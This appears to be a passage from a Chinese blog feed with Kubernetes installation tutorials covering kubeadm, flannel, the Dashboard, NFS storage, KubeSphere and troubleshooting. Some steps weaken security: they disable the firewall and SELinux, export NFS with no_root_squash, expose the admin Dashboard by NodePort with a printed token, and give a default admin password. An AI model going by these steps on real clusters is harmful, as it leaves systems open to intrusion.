class="hljs-meta prompt_"># </span><span class="language-bash">https://raw.githubusercontent.com/coreos/flannel/master/Documentation/kube-flannel.yml需要科学上网才能访问，</span><span class="hljs-meta prompt_"># </span><span class="language-bash">可在你的电脑访问后，在master服务器上创建kube-flannel.yaml后，粘贴进去。</span>kubectl apply -f https://raw.githubusercontent.com/coreos/flannel/master/Documentation/kube-flannel.yml<span class="hljs-meta prompt_"></span><span class="hljs-meta prompt_"># </span><span class="language-bash">查看节点状态，状态必须为ready</span>kubectl get nodes<span class="hljs-meta prompt_"></span><span class="hljs-meta prompt_"># </span><span class="language-bash">查看加入集群的命令</span>kubeadm token create --print-join-commandlanguage-shell复制代码</code></pre><hr><h2 id="1-10-其他机器加入集群"><a href="#1-10-其他机器加入集群" class="headerlink" title="1.10 其他机器加入集群"></a>1.10 其他机器加入集群</h2><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">在其他节点中执行1~8的步骤</span><span class="hljs-meta prompt_"># </span><span class="language-bash">执行第9步骤中加入集群的命令，类似以下的命令</span>kubeadm join 192.168.18.200:6443 --token opip9p.rh35kkvqzwjizely --discovery-token-ca-cert-hash sha256:9252e13d2ffd3569c40b02c477f59038fac39aade9e99f282a333c0f8c5d7b22language-shell复制代码</code></pre><h2 id="1-11-测试"><a href="#1-11-测试" class="headerlink" title="1.11 测试"></a>1.11 测试</h2><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">https://raw.githubusercontent.com/kubernetes/website/master/content/en/examples/application/nginx-app.yaml需要科学上网才能访问，</span><span class="hljs-meta prompt_"># </span><span class="language-bash">可在你的电脑访问后，在master服务器上创建nginx-app.yaml后，粘贴进去。</span>kubectl apply -f https://raw.githubusercontent.com/kubernetes/website/master/content/en/examples/application/nginx-app.yaml<span class="hljs-meta prompt_"># </span><span class="language-bash">执行如下命令查看副本（pod）情况</span>kubectl get pods -o wide<span class="hljs-meta prompt_"># </span><span class="language-bash">执行如下命令则可以查看 services 状态。</span>kubectl get servicelanguage-shell复制代码</code></pre><hr><h1 id="第二章-k8s-DashBoard"><a href="#第二章-k8s-DashBoard" class="headerlink" title="第二章 k8s DashBoard"></a>第二章 k8s DashBoard</h1><h2 id="2-1-安装DashBoard"><a href="#2-1-安装DashBoard" class="headerlink" title="2.1 安装DashBoard"></a>2.1 安装DashBoard</h2><pre><code class="hljs yaml"><span class="hljs-comment"># 用浏览器打开以下文件并复制</span><span class="hljs-comment"># https://kuboard.cn/install-script/k8s-dashboard/v2.0.0-beta5.yaml</span><span class="hljs-comment"># 打开你的电脑创建dashboard.yaml</span><span class="hljs-comment"># 粘贴复制的内容</span><span class="hljs-comment"># 找到以下内容</span><span class="hljs-attr">kind:</span> <span class="hljs-string">Service</span><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><span class="hljs-attr">metadata:</span>  <span class="hljs-attr">labels:</span>    <span class="hljs-attr">k8s-app:</span> <span class="hljs-string">kubernetes-dashboard</span>  <span class="hljs-attr">name:</span> <span class="hljs-string">kubernetes-dashboard</span>  <span class="hljs-attr">namespace:</span> <span class="hljs-string">kubernetes-dashboard</span><span class="hljs-attr">spec:</span>  <span class="hljs-attr">ports:</span>    <span class="hljs-bullet">-</span> <span class="hljs-attr">port:</span> <span class="hljs-number">443</span>      <span class="hljs-attr">targetPort:</span> <span class="hljs-number">8443</span>  <span class="hljs-attr">type:</span> <span class="hljs-string">NodePort</span> <span class="hljs-comment"># 加入这一行，使用NodePort模式</span>  <span class="hljs-attr">selector:</span>    <span class="hljs-attr">k8s-app:</span> <span class="hljs-string">kubernetes-dashboard</span><span class="hljs-string">language-yaml复制代码</span></code></pre><hr><h2 id="2-2-生成token"><a href="#2-2-生成token" class="headerlink" title="2.2 生成token"></a>2.2 生成token</h2><pre><code class="hljs shell">kubectl apply -f https://kuboard.cn/install-script/k8s-dashboard/auth.yaml<span class="hljs-meta prompt_"># </span><span class="language-bash">查看token值</span>kubectl -n kubernetes-dashboard describe secret $(kubectl -n kubernetes-dashboard get secret | grep admin-user | awk &#x27;&#123;print $1&#125;&#x27;)language-shell复制代码</code></pre><p>生成类似以下的内容</p><pre><code class="hljs shell">Name:         admin-user-token-v57nwNamespace:    kubernetes-dashboardLabels:       &lt;none&gt;Annotations:  kubernetes.io/service-account.name: admin-user              kubernetes.io/service-account.uid: 0303243c-4040-4a58-8a47-849ee9ba79c1Type:  kubernetes.io/service-account-tokenData====ca.crt:     1066 bytesnamespace:  20 bytestoken:      eyJhbGciOiJSUzI1NiIsImtpZCI6IiJ9.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlcm5ldGVzLWRhc2hib2FyZCIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJhZG1pbi11c2VyLXRva2VuLXY1N253Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6ImFkbWluLXVzZXIiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiIwMzAzMjQzYy00MDQwLTRhNTgtOGE0Ny04NDllZTliYTc5YzEiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6a3ViZXJuZXRlcy1kYXNoYm9hcmQ6YWRtaW4tdXNlciJ9.Z2JrQlitASVwWbc-s6deLRFVk5DWD3P_vjUFXsqVSY10pbjFLG4njoZwh8p3tLxnX_VBsr7_6bwxhWSYChp9hwxznemD5x5HLtjb16kI9Z7yFWLtohzkTwuFbqmQaMoget_nYcQBUC5fDmBHRfFvNKePh_vSSb2h_aYXa8GV5AcfPQpY7r461itme1EXHQJqv-SN-zUnguDguCTjD80pFZ_CmnSE1z9QdMHPB8hoB4V68gtswR1VLa6mSYdgPwCHauuOobojALSaMc3RH7MmFUumAgguhqAkX3Omqd3rJbYOMRuMjhANqd08piDC3aIabINX6gP5-Tuuw2svnV6NYQlanguage-shell复制代码</code></pre><hr><h2 id="2-3-查看Dashboard运行的端口"><a href="#2-3-查看Dashboard运行的端口" class="headerlink" title="2.3 查看Dashboard运行的端口"></a>2.3 查看Dashboard运行的端口</h2><pre><code class="hljs shell">kubectl -n kubernetes-dashboard get svc -o wideNAME                        TYPE           CLUSTER-IP      EXTERNAL-IP   PORT(S)         AGE     SELECTORdashboard-metrics-scraper   ClusterIP      10.98.73.37     &lt;none&gt;        8000/TCP        16m     k8s-app=dashboard-metrics-scraperkubernetes-dashboard        NodePort       10.111.244.42   &lt;none&gt;        443:30307/TCP   16m     k8s-app=kubernetes-dashboard<span class="hljs-meta prompt_"># </span><span class="language-bash">浏览器输入https://node地址:30307(端口)</span>language-shell复制代码</code></pre><hr><h1 id="第三章-kubesphere"><a href="#第三章-kubesphere" class="headerlink" title="第三章 kubesphere"></a>第三章 kubesphere</h1><h2 id="3-1-kubesphere-前置要求"><a href="#3-1-kubesphere-前置要求" class="headerlink" title="3.1 kubesphere 前置要求"></a>3.1 kubesphere 前置要求</h2><blockquote><p>Kubernetes 版本必须为：1.17.x、1.18.x、1.19.x 或 1.20.x<br>确保您的机器满足最低硬件要求：CPU &gt; 1 核，内存 &gt; 2 GB<br>在安装之前，需要配置 Kubernetes 集群中的默认存储类型</p></blockquote><hr><h2 id="3-2-k8s安装指定的版本"><a href="#3-2-k8s安装指定的版本" class="headerlink" title="3.2 k8s安装指定的版本"></a>3.2 k8s安装指定的版本</h2><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">查看可安装的k8s版本</span>yum list kubelet kubeadm kubectl  --showduplicates|sort -r<span class="hljs-meta prompt_"># </span><span class="language-bash">k8s安装指定的版本</span><span class="hljs-meta prompt_"># </span><span class="language-bash">Kubernetes 版本必须为：1.17.x、1.18.x、1.19.x 或 1.20.x</span><span class="hljs-meta prompt_"># </span><span class="language-bash">所以就安装了1.20.x</span>yum install kubelet-1.20.1-0 kubeadm-1.20.1-0 kubectl-1.20.1-0language-shell复制代码</code></pre><hr><h2 id="3-3-创建存储类型"><a href="#3-3-创建存储类型" class="headerlink" title="3.3 创建存储类型"></a>3.3 创建存储类型</h2><blockquote><p>因为公司只有俩台服务,node节点性能和硬盘较大， 所以在node节点上部署存储服务，使用的是nfs。</p></blockquote><hr><h2 id="3-4-创建nfs服务端"><a href="#3-4-创建nfs服务端" class="headerlink" title="3.4 创建nfs服务端"></a>3.4 创建nfs服务端</h2><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">创建共享目录,(目录可自定义)</span>mkdir -p /data/kubernetes<span class="hljs-meta prompt_"># </span><span class="language-bash">安装组件</span>yum -y install nfs-utils rpcbind<span class="hljs-meta prompt_"># </span><span class="language-bash">编辑配置文件</span>vim /etc/exports<span class="hljs-meta prompt_"># </span><span class="language-bash">写入内容如下</span>/data/kubernetes 192.168.18.0/24(rw,sync,no_root_squash)<span class="hljs-meta prompt_"># </span><span class="language-bash">这里的192.168.18.0/24，表示客户端访问白名单。只有符合的ip，才能访问</span><span class="hljs-meta prompt_"># </span><span class="language-bash">启动nfs服务</span>service nfs startservice rpcbind start<span class="hljs-meta prompt_"># </span><span class="language-bash">设置开机启动</span>systemctl enable nfssystemctl enable rpcbindlanguage-shell复制代码</code></pre><hr><h2 id="3-5-客户端使用nfs"><a href="#3-5-客户端使用nfs" class="headerlink" title="3.5 客户端使用nfs"></a>3.5 客户端使用nfs</h2><blockquote><p>在master安装nfs客户端</p></blockquote><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">登录主机k8s-master，创建目录</span>mkdir nfsvolume<span class="hljs-meta prompt_"># </span><span class="language-bash">下载yaml文件</span>https://raw.githubusercontent.com/kubernetes-incubator/external-storage/master/nfs-client/deploy/rbac.yamlhttps://raw.githubusercontent.com/kubernetes-incubator/external-storage/master/nfs-client/deploy/class.yamlhttps://raw.githubusercontent.com/kubernetes-incubator/external-storage/master/nfs-client/deploy/deployment.yaml<span class="hljs-meta prompt_"># </span><span class="language-bash">修改 deployment.yaml 中的两处 NFS 服务器 IP 和目录</span>...          env:            - name: PROVISIONER_NAME              value: fuseim.pri/ifs            - name: NFS_SERVER              value: 192.168.18.199            - name: NFS_PATH              value: /data/kubernetes      volumes:        - name: nfs-client-root          nfs:            server: 192.168.18.199            path: /data/kubernetes<span class="hljs-meta prompt_"># </span><span class="language-bash">部署创建</span>kubectl create -f rbac.yamlkubectl create -f class.yamlkubectl create -f deployment.yamllanguage-shell复制代码<span class="hljs-meta prompt_"># </span><span class="language-bash">每个节点都要安装nfs-tuils</span>yum -y install nfs-utils<span class="hljs-meta prompt_"># </span><span class="language-bash">在master执行</span>kubectl get storageclass<span class="hljs-meta prompt_"># </span><span class="language-bash">以下是终端打印示例内容</span>NAME                            PROVISIONER      AGEmanaged-nfs-storage    fuseim.pri/ifs   139m<span class="hljs-meta prompt_"># </span><span class="language-bash">查看nfs pod, 确保状态正常</span>kubectl get podsNAME                                      READY   STATUS    RESTARTS   AGEnfs-client-provisioner-59777fb457-dkf87   1/1     Running   0          153m<span class="hljs-meta prompt_"># </span><span class="language-bash">标记一个默认的StorageClass</span><span class="hljs-meta prompt_"># </span><span class="language-bash">最多只有一个StorageClass能够标记为默认</span>kubectl patch storageclass managed-nfs-storage -p &#x27;&#123;&quot;metadata&quot;: &#123;&quot;annotations&quot;:&#123;&quot;storageclass.kubernetes.io/is-default-class&quot;:&quot;true&quot;&#125;&#125;&#125;&#x27;<span class="hljs-meta prompt_"></span><span class="hljs-meta prompt_"># </span><span class="language-bash">验证标记是否成功</span>kubectl get storageclassNAME                            PROVISIONER      AGEmanaged-nfs-storage (default)   fuseim.pri/ifs   139mlanguage-shell复制代码</code></pre><hr><h2 id="3-6-安装kubeSphere"><a href="#3-6-安装kubeSphere" class="headerlink" title="3.6 安装kubeSphere"></a>3.6 安装kubeSphere</h2><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">安装的kubesphere 3.1.1</span>kubectl apply -f https://github.com/kubesphere/ks-installer/releases/download/v3.1.1/kubesphere-installer.yaml   kubectl apply -f https://github.com/kubesphere/ks-installer/releases/download/v3.1.1/cluster-configuration.yaml<span class="hljs-meta prompt_"># </span><span class="language-bash">检查安装日志</span>kubectl logs -n kubesphere-system $(kubectl get pod -n kubesphere-system -l app=ks-install -o jsonpath=&#x27;&#123;.items[0].metadata.name&#125;&#x27;) -f<span class="hljs-meta prompt_"># </span><span class="language-bash">使用 kubectl get pod --all-namespaces 查看所有 Pod 是否在 KubeSphere 的相关命名空间中正常运行。如果是，请通过以下命令检查控制台的端口（默认为 30880）:</span>kubectl get svc/ks-console -n kubesphere-system<span class="hljs-meta prompt_"># </span><span class="language-bash">确保在安全组中打开了端口 30880，并通过 NodePort (IP:30880) 使用默认帐户和密码 (admin/P@88w0rd) 访问 Web 控制台。</span>language-shell复制代码</code></pre><hr><h1 id="第四章-error"><a href="#第四章-error" class="headerlink" title="第四章 error"></a>第四章 error</h1><h2 id="4-1-关于prometheus-k8s-0-启动失败，一直-pending-状态。"><a href="#4-1-关于prometheus-k8s-0-启动失败，一直-pending-状态。" class="headerlink" title="4.1 关于prometheus-k8s-0 启动失败，一直 pending 状态。"></a>4.1 关于prometheus-k8s-0 启动失败，一直 pending 状态。</h2><blockquote><p>虽然kubesphere安装成功，但是健康检测服务可能没起来<br>主要原因是没有pvc<br><a href="https://kubesphere.com.cn/forum/d/5445-prometheus-k8s-0-pending">参考连接</a></p></blockquote><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">创建pvc</span>vim pvc.yaml<span class="hljs-meta prompt_"># </span><span class="language-bash">写入以下内容</span>kind: PersistentVolumeClaimapiVersion: v1metadata:  name: test-pvc  annotations:    volume.beta.kubernetes.io/storage-class: &quot;managed-nfs-storage&quot;spec:  accessModes:    - ReadWriteMany  resources:    requests:      storage: 21Gi<span class="hljs-meta prompt_"># </span><span class="language-bash">执行pvc.yaml</span>kubectl create -f pvc.yaml<span class="hljs-meta prompt_"># </span><span class="language-bash">验证是否成功</span>kubectl get pvclanguage-shell复制代码</code></pre><blockquote><p>修改&#x2F;etc&#x2F;kubernetes&#x2F;manifests&#x2F;kube-apiserver.yaml</p></blockquote><pre><code class="hljs yaml"><span class="hljs-comment"># 在以下内容</span><span class="hljs-attr">spec:</span>  <span class="hljs-attr">containers:</span>  <span class="hljs-bullet">-</span> <span class="hljs-attr">command:</span>    <span class="hljs-bullet">-</span> <span class="hljs-string">kube-apiserver</span><span class="hljs-comment"># 加入这行</span><span class="hljs-bullet">-</span> <span class="hljs-string">--feature-gates=RemoveSelfLink=false</span><span class="hljs-comment"># 执行</span><span class="hljs-string">kubectl</span> <span class="hljs-string">apply</span> <span class="hljs-string">-f</span> <span class="hljs-string">/etc/kubernetes/manifests/kube-apiserver.yaml</span><span class="hljs-string">language-yaml复制代码</span></code></pre><hr><h2 id="4-2-cni0问题"><a href="#4-2-cni0问题" class="headerlink" title="4.2 cni0问题"></a>4.2 cni0问题</h2><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">可以使用类似以下的命令查看pod的运行描述信息</span>kubectl describe pod coredns-*** -n kube-system<span class="hljs-meta prompt_"># </span><span class="language-bash">发现报错信息为类似<span class="hljs-string">&quot;network: failed to set bridge addr: &quot;</span>cni0<span class="hljs-string">&quot; already has an IP address different from 10.244.0.1/24&quot;</span></span>language-shell复制代码</code></pre><p><strong>解决办法</strong></p><blockquote><p>该方法会重置集群！！！！！该方法会重置集群！！！！！该方法会重置集群！！！！！该方法会重置集群！！！！！</p></blockquote><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">在所有节点（master和slave节点）删除cni0，以及暂停k8s和docker。</span>kubeadm reset systemctl stop kubeletsystemctl stop dockerrm -rf /var/lib/cni/rm -rf /var/lib/kubelet/rm -rf /etc/cni/ifconfig cni0 downifconfig flannel.1 downifconfig docker0 downip link delete cni0ip link delete flannel.1<span class="hljs-meta prompt_"># </span><span class="language-bash">在所有节点重启kubelet和docker</span>systemctl start kubeletsystemctl start docker<span class="hljs-meta prompt_"># </span><span class="language-bash">重新创建集群</span>language-shell复制代码</code></pre><hr>]]></content>
      
      
      <categories>
          
          <category> 运维 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>K8s</title>
      <link href="/2021/09/15/K8s/"/>
      <url>/2021/09/15/K8s/</url>
      
        <content type="html"><![CDATA[<h1 id="1-安装docker"><a href="#1-安装docker" class="headerlink" title="1. 安装docker"></a>1. 安装docker</h1><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">安装docker所需的工具</span>yum install -y yum-utils device-mapper-persistent-data lvm2<span class="hljs-meta prompt_"># </span><span class="language-bash">配置阿里云的docker源</span>yum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo<span class="hljs-meta prompt_"># </span><span class="language-bash">指定安装这个版本的docker-ce</span>yum install -y docker-ce-18.09.9-3.el7<span class="hljs-meta prompt_"># </span><span class="language-bash">启动docker</span>systemctl enable docker &amp;&amp; systemctl start dockerlanguage-shell复制代码</code></pre><hr><h1 id="2-only-centos"><a href="#2-only-centos" class="headerlink" title="2. only centos"></a>2. only centos</h1><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">关闭防火墙</span>systemctl disable firewalldsystemctl stop firewalld<span class="hljs-meta prompt_"># </span><span class="language-bash">关闭selinux</span><span class="hljs-meta prompt_"># </span><span class="language-bash">临时禁用selinux</span>setenforce 0<span class="hljs-meta prompt_"># </span><span class="language-bash">永久关闭 修改/etc/sysconfig/selinux文件设置</span>sed -i &#x27;s/SELINUX=permissive/SELINUX=disabled/&#x27; /etc/sysconfig/selinuxsed -i &quot;s/SELINUX=enforcing/SELINUX=disabled/g&quot; /etc/selinux/config<span class="hljs-meta prompt_"># </span><span class="language-bash">禁用交换分区</span>swapoff -a<span class="hljs-meta prompt_"># </span><span class="language-bash">永久禁用，打开/etc/fstab注释掉swap那一行。</span>sed -i &#x27;s/.*swap.*/#&amp;/&#x27; /etc/fstab<span class="hljs-meta prompt_"># </span><span class="language-bash">修改内核参数</span>cat &lt;&lt;EOF &gt;  /etc/sysctl.d/k8s.confnet.bridge.bridge-nf-call-ip6tables = 1net.bridge.bridge-nf-call-iptables = 1EOFsysctl --systemlanguage-shell复制代码</code></pre><h1 id="3-更改k8阿里云源"><a href="#3-更改k8阿里云源" class="headerlink" title="3.更改k8阿里云源"></a>3.更改k8阿里云源</h1><pre><code class="hljs shell">cat &lt;&lt;EOF &gt; /etc/yum.repos.d/kubernetes.repo[kubernetes]name=Kubernetesbaseurl=https://mirrors.aliyun.com/kubernetes/yum/repos/kubernetes-el7-x86_64/enabled=1gpgcheck=1repo_gpgcheck=1gpgkey=https://mirrors.aliyun.com/kubernetes/yum/doc/yum-key.gpg https://mirrors.aliyun.com/kubernetes/yum/doc/rpm-package-key.gpgEOFlanguage-shell复制代码</code></pre><h1 id="4-允许-iptables-检查桥接流量"><a href="#4-允许-iptables-检查桥接流量" class="headerlink" title="4.允许 iptables 检查桥接流量"></a>4.允许 iptables 检查桥接流量</h1><pre><code class="hljs shell">cat &lt;&lt;EOF | sudo tee /etc/modules-load.d/k8s.confbr_netfilterEOFcat &lt;&lt;EOF | sudo tee /etc/sysctl.d/k8s.confnet.bridge.bridge-nf-call-ip6tables = 1net.bridge.bridge-nf-call-iptables = 1EOFsudo sysctl --systemlanguage-shell复制代码</code></pre><hr><h1 id="5-安装kubeadm"><a href="#5-安装kubeadm" class="headerlink" title="5. 安装kubeadm"></a>5. 安装kubeadm</h1><pre><code class="hljs shell">yum install -y kubelet-1.20.1-0 kubeadm-1.20.1-0 kubectl-1.20.1-0 --disableexcludes=kubernetessudo systemctl enable --now kubeletlanguage-shell复制代码</code></pre><hr><h1 id="6-编写docker文件"><a href="#6-编写docker文件" class="headerlink" title="6.编写docker文件"></a>6.编写docker文件</h1><ol><li>编辑daemon文件：<code>vi /etc/docker/daemon.json</code></li></ol><pre><code class="hljs bash">&#123;    <span class="hljs-string">&quot;exec-opts&quot;</span>: [<span class="hljs-string">&quot;native.cgroupdriver=systemd&quot;</span>]&#125;</code></pre><hr><h1 id="7-设置科学上网-可以不设置"><a href="#7-设置科学上网-可以不设置" class="headerlink" title="7.设置科学上网(可以不设置)"></a>7.设置科学上网(可以不设置)</h1><ol><li>编辑配置文件：<code>vi /etc/profile</code></li></ol><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">IP:同一个局域网内可以翻墙机器的IP地址，Port为代理的端口</span>export proxy=&quot;http://IP:Port&quot;export http_proxy=$proxy export https_proxy=$proxy export ftp_proxy=$proxy export no_proxy=&quot;localhost, 127.0.0.1, ::1&quot;language-shell复制代码</code></pre><ol><li>更新配置文件</li></ol><pre><code class="hljs shell">source /etc/profilelanguage-shell复制代码</code></pre><ol><li>测试</li></ol><pre><code class="hljs shell">curl http://www.google.comlanguage-shell复制代码</code></pre><hr><h1 id="8-Docker网络代理设置"><a href="#8-Docker网络代理设置" class="headerlink" title="8.Docker网络代理设置"></a>8.Docker网络代理设置</h1><ol><li>创建和编辑docker服务文件：</li></ol><pre><code class="hljs shell">mkdir -p /etc/systemd/system/docker.service.dlanguage-shell复制代码</code></pre><ol><li>创建和编辑文件</li></ol><pre><code class="hljs shell">vi /etc/systemd/system/docker.service.d/http-proxy.confi<span class="hljs-meta prompt_"># </span><span class="language-bash">中[proxy-addr]和[proxy-port]分别改成实际情况的代理地址和端口</span>[Service]Environment=&quot;HTTP_PROXY=http://[proxy-addr]:[proxy-port]/&quot; &quot;HTTPS_PROXY=http://[proxy-addr]:[proxy-port]/&quot;language-shell复制代码</code></pre><ol><li>更新配置文件和重启docker</li></ol><pre><code class="hljs nsis"><span class="hljs-params">system</span>ctl daemon-reload<span class="hljs-params">system</span>ctl restart docker复制代码</code></pre><hr><h1 id="9-下载镜像"><a href="#9-下载镜像" class="headerlink" title="9.下载镜像"></a>9.下载镜像</h1><ol><li>下载安装k8s所需的镜像</li></ol><pre><code class="hljs shell">kubeadm config images pulllanguage-shell复制代码</code></pre><ol><li>下载flannel</li></ol><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">下载flanner镜像</span>docker pull quay.mirrors.ustc.edu.cn/coreos/flannel:v0.14.0 docker tag quay.mirrors.ustc.edu.cn/coreos/flannel:v0.14.0  quay.io/coreos/flannel:v0.14.0docker rmi quay.mirrors.ustc.edu.cn/coreos/flannel:v0.14.0language-shell复制代码</code></pre><h1 id="10-关闭代理"><a href="#10-关闭代理" class="headerlink" title="10.关闭代理"></a>10.关闭代理</h1><ol><li>关闭科学上网</li></ol><ul><li>编辑配置文件并注释相关配置</li></ul><pre><code class="hljs shell">vi /etc/profilelanguage-shell复制代码</code></pre><ul><li>如果要关闭代理，仅仅注释掉profile的代理内容是不行的，在文件内加入以下内容</li></ul><pre><code class="hljs bash"><span class="hljs-built_in">unset</span> http_proxy<span class="hljs-built_in">unset</span> https_proxy<span class="hljs-built_in">unset</span> ftp_proxy<span class="hljs-built_in">unset</span> no_proxy</code></pre><ul><li>更新配置文件</li></ul><pre><code class="hljs shell">source /etc/profilelanguage-shell复制代码</code></pre><ol><li>关闭Docker代理(可以不关闭)</li></ol><ul><li>编辑配置文件，注释相关配置</li></ul><pre><code class="hljs shell">vi /etc/systemd/system/docker.service.d/http-proxy.conflanguage-shell复制代码</code></pre><ul><li>更新配置并重启docker</li></ul><pre><code class="hljs shell">systemctl daemon-reloadsystemctl restart dockerlanguage-shell复制代码</code></pre><h1 id="11-在maste上创建集群"><a href="#11-在maste上创建集群" class="headerlink" title="11.在maste上创建集群"></a>11.在maste上创建集群</h1><ol><li>在master上创建集群</li></ol><pre><code class="hljs brainfuck"><span class="hljs-comment"># 192</span><span class="hljs-string">.</span><span class="hljs-comment">168</span><span class="hljs-string">.</span><span class="hljs-comment">18</span><span class="hljs-string">.</span><span class="hljs-comment">200为masteip；10</span><span class="hljs-string">.</span><span class="hljs-comment">244</span><span class="hljs-string">.</span><span class="hljs-comment">0</span><span class="hljs-string">.</span><span class="hljs-comment">0/16为pod地址池；kubeadm</span><span class="hljs-literal">-</span><span class="hljs-comment">config</span><span class="hljs-string">.</span><span class="hljs-comment">yaml是配置 kubelet 的 cgroup 驱动的文件</span><span class="hljs-comment"># kubeadm init</span> <span class="hljs-literal">--</span><span class="hljs-comment">apiserver</span><span class="hljs-literal">-</span><span class="hljs-comment">advertise</span><span class="hljs-literal">-</span><span class="hljs-comment">address 192</span><span class="hljs-string">.</span><span class="hljs-comment">168</span><span class="hljs-string">.</span><span class="hljs-comment">18</span><span class="hljs-string">.</span><span class="hljs-comment">200</span> <span class="hljs-literal">--</span><span class="hljs-comment">pod</span><span class="hljs-literal">-</span><span class="hljs-comment">network</span><span class="hljs-literal">-</span><span class="hljs-comment">cidr=10</span><span class="hljs-string">.</span><span class="hljs-comment">244</span><span class="hljs-string">.</span><span class="hljs-comment">0</span><span class="hljs-string">.</span><span class="hljs-comment">0/16</span> <span class="hljs-literal">--</span><span class="hljs-comment">config kubeadm</span><span class="hljs-literal">-</span><span class="hljs-comment">config</span><span class="hljs-string">.</span><span class="hljs-comment">yaml</span><span class="hljs-comment">kubeadm init</span> <span class="hljs-literal">--</span><span class="hljs-comment">apiserver</span><span class="hljs-literal">-</span><span class="hljs-comment">advertise</span><span class="hljs-literal">-</span><span class="hljs-comment">address 10</span><span class="hljs-string">.</span><span class="hljs-comment">0</span><span class="hljs-string">.</span><span class="hljs-comment">1</span><span class="hljs-string">.</span><span class="hljs-comment">128</span> <span class="hljs-literal">--</span><span class="hljs-comment">pod</span><span class="hljs-literal">-</span><span class="hljs-comment">network</span><span class="hljs-literal">-</span><span class="hljs-comment">cidr=10</span><span class="hljs-string">.</span><span class="hljs-comment">244</span><span class="hljs-string">.</span><span class="hljs-comment">0</span><span class="hljs-string">.</span><span class="hljs-comment">0/16</span> <span class="hljs-literal">--</span><span class="hljs-comment">ignore</span><span class="hljs-literal">-</span><span class="hljs-comment">preflight</span><span class="hljs-literal">-</span><span class="hljs-comment">errors=</span><span class="hljs-string">.</span><span class="hljs-string">.</span><span class="hljs-string">.</span><span class="hljs-comment">复制代码</span></code></pre><ol><li>安装flanner网络</li></ol><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">接着还需要执行如下命令安装 Pod 网络（这里我们使用 flannel），否则 Pod 之间无法通信。</span><span class="hljs-meta prompt_"># </span><span class="language-bash">https://raw.githubusercontent.com/coreos/flannel/master/Documentation/kube-flannel.yml需要科学上网才能访问，</span><span class="hljs-meta prompt_"># </span><span class="language-bash">kubectl apply -f https://raw.githubusercontent.com/coreos/flannel/master/Documentation/kube-flannel.yml</span>kubectl apply -f kube-flannel.ymllanguage-shell复制代码</code></pre><ul><li>创建和编辑kube-flannel.yml文件: <code>vi kube-flannel.yml</code></li></ul><pre><code class="hljs bash">---apiVersion: policy/v1beta1kind: PodSecurityPolicymetadata:  name: psp.flannel.unprivileged  annotations:    seccomp.security.alpha.kubernetes.io/allowedProfileNames: docker/default    seccomp.security.alpha.kubernetes.io/defaultProfileName: docker/default    apparmor.security.beta.kubernetes.io/allowedProfileNames: runtime/default    apparmor.security.beta.kubernetes.io/defaultProfileName: runtime/defaultspec:  privileged: <span class="hljs-literal">false</span>  volumes:  - configMap  - secret  - emptyDir  - hostPath  allowedHostPaths:  - pathPrefix: <span class="hljs-string">&quot;/etc/cni/net.d&quot;</span>  - pathPrefix: <span class="hljs-string">&quot;/etc/kube-flannel&quot;</span>  - pathPrefix: <span class="hljs-string">&quot;/run/flannel&quot;</span>  readOnlyRootFilesystem: <span class="hljs-literal">false</span>  <span class="hljs-comment"># Users and groups</span>  runAsUser:    rule: RunAsAny  supplementalGroups:    rule: RunAsAny  fsGroup:    rule: RunAsAny  <span class="hljs-comment"># Privilege Escalation</span>  allowPrivilegeEscalation: <span class="hljs-literal">false</span>  defaultAllowPrivilegeEscalation: <span class="hljs-literal">false</span>  <span class="hljs-comment"># Capabilities</span>  allowedCapabilities: [<span class="hljs-string">&#x27;NET_ADMIN&#x27;</span>, <span class="hljs-string">&#x27;NET_RAW&#x27;</span>]  defaultAddCapabilities: []  requiredDropCapabilities: []  <span class="hljs-comment"># Host namespaces</span>  hostPID: <span class="hljs-literal">false</span>  hostIPC: <span class="hljs-literal">false</span>  hostNetwork: <span class="hljs-literal">true</span>  hostPorts:  - min: 0    max: 65535  <span class="hljs-comment"># SELinux</span>  seLinux:    <span class="hljs-comment"># SELinux is unused in CaaSP</span>    rule: <span class="hljs-string">&#x27;RunAsAny&#x27;</span>---kind: ClusterRoleapiVersion: rbac.authorization.k8s.io/v1metadata:  name: flannelrules:- apiGroups: [<span class="hljs-string">&#x27;extensions&#x27;</span>]  resources: [<span class="hljs-string">&#x27;podsecuritypolicies&#x27;</span>]  verbs: [<span class="hljs-string">&#x27;use&#x27;</span>]  resourceNames: [<span class="hljs-string">&#x27;psp.flannel.unprivileged&#x27;</span>]- apiGroups:  - <span class="hljs-string">&quot;&quot;</span>  resources:  - pods  verbs:  - get- apiGroups:  - <span class="hljs-string">&quot;&quot;</span>  resources:  - nodes  verbs:  - list  - watch- apiGroups:  - <span class="hljs-string">&quot;&quot;</span>  resources:  - nodes/status  verbs:  - patch---kind: ClusterRoleBindingapiVersion: 